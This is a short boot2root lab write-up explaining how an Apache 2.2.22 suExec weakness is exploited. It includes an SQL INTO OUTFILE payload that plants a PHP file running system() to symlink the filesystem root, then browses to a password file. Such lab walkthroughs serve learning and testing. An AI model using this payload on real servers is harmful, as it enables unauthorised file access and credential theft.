# Boot2Root - A patchy web server

Starting from `Step 4 - Reverse shell`.

## Step 4 - suExec
We check of there are vulnerabilities with the currently used version of Apache (`2.2.22`).
There is an exploit that requires us to create a specific PHP file and load it with the server.

We then create it just as in `writeup1`, but with the `apache.php` file.

```
SELECT '<?php system("ln -sf / test99.php"); symlink("/", "test99.php"); ?>' INTO OUTFILE "/var/www/forum/templates_c/apache.php"
```

Now we open the link `https://<IP>/forum/templates_c/apache.php`, which will create a folder
named `test99.php`. This folder is actually a symlink to `/`.
Opening it will open a file browser to the root of the FS. Now we just have to check `/home/LOOKATME/password`.

And now back to `Step 5 - Sanitize`

## Sources
suExec exploit: https://www.exploit-db.com/exploits/27397